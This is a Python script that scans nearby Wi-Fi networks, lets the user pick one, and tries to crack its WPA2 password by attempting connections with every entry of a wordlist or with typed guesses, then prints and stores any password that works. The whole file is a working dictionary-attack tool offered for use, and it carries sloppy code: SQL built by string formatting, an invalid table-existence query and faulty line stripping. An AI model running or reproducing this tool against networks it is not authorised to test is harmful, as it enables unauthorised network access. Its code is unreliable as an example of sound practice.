from pywifi import const,PyWiFi,Profile
from time import sleep
from winsound import Beep # just for Windows
import datetime
import sqlite3
import os

class SQlConnector:
    TABLE_NAME = "PasswordsChecks"
    def __init__(self,dbName:str):
        if not os.path.isfile(dbName):
            with open("passwords.db","w") as f:
                pass
            print("File Create Successfully ... \n")
        self.sqlconnection = sqlite3.connect(dbName)
        self.cursor = self.sqlconnection.cursor()
        print("Connected")
    def create_table(self):
        create_table_command = f"""
            CREATE TABLE {self.TABLE_NAME} (
                id INTEGER PRIMARY KEY,
                password TEXT NOT NULL,
                ssid TEXT NOT NULL,
                setdate datetime,
                status INTEGER NOT NULL );
        """
        try:
            self.cursor.execute(create_table_command)
            print("Successfully Created ")
        except sqlite3.OperationalError:
            pass
    def is_exists_table(self):
        is_exitsts_command = f"""
            IF (EXISTS (SELECT * 
                 FROM INFORMATION_SCHEMA.TABLES 
                 WHERE TABLE_SCHEMA = 'TheSchema' 
                 AND  TABLE_NAME = '{self.TABLE_NAME}'))
        """
        self.cursor.execute(is_exitsts_command)
    def insert_into(self,password:str,ssid,status:int,set_date:datetime.datetime = datetime.datetime.now()):
        insert_into_command = f"""
        INSERT INTO {self.TABLE_NAME} (password,ssid,setdate,status) VALUES (\"{password}\",\"{ssid}\",\"{set_date}\",\"{status}\")
        """
        self.cursor.execute(insert_into_command)
        return True
        


class Wifi:
    def __init__(self):
        self.sql = SQlConnector("passwords.db")
        self.sql.create_table()

        self.wifi = PyWiFi()
        self.interface = self.wifi.interfaces()[0]
        self.password_list = "passwords.txt"
        self.wifis = self.scan_wifi()
        for i in range(len(self.wifis)):
            print("{} - {}".format(i+1 ,self.wifis[i].ssid))
        index = int(input("\n>> "))
        self.target = self.wifis[index-1]
        print("Starting At : ---->>>",datetime.datetime.now())
        i = 0
        custom_password = input("Do you Want to Enter your Custom Password ? if yes enter y and no enter n \n")
        custom_password = custom_password.lower()
        if custom_password == "y":
            self.connect_config(self.target,"custom")
        else:
            self.connect_config(self.target,"auto")
        print(f"{i} Test")
        print("Finished At : ---->>>",datetime.datetime.now())
    def scan_wifi(self):
        self.interface.scan()
        sleep(8)
        result = self.interface.scan_results()
        return result
    def try_to_connect(self,ssid,password):
        self.interface.disconnect()
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        self.interface.connect(self.interface.add_network_profile(profile))
        sleep(3)
        if self.interface.status() == const.IFACE_CONNECTED:
            self.interface.remove_network_profile(profile)
            return True
        else:
            self.interface.remove_network_profile(profile)
            return False
    def connect_config(self,target,mode:str):
        i = 0
        if mode == "custom":
            while True:
                password = input("Please Enter Password : \n")
                print("Testing : {}".format(password))
                if self.try_to_connect(target.ssid , password) : # Test for connection using password
                    Beep(700 , 500) # Boooooghhh (just for windows)
                    Beep(1000 , 500) # BOOOOOOGHHHHHHH :|  (just for windows)
                    print("-" *30)
                    print("PASSWORD : {}".format(password))
                    print("-" *30)
                    self.sql.insert_into(password,target.ssid,1)
                    break
                i+=1
                self.sql.insert_into(password,target.ssid,0)

        else:
            for password in open(self.password_list,"r"):
                password = password.strip(".")
                print("Testing : {}".format(password))
                if self.try_to_connect(self.target.ssid , password) : # Test for connection using password
                    Beep(700 , 500) # Boooooghhh (just for windows)
                    Beep(1000 , 500) # BOOOOOOGHHHHHHH :|  (just for windows)
                    print("-" *30)
                    print("PASSWORD : {}".format(password))
                    print("-" *30)
                    self.sql.insert_into(password,target.ssid,1)
                    break
                i+=1
                self.sql.insert_into(password,target.ssid,0)
        print(i)
    

if __name__ == "__main__":
    Wifi()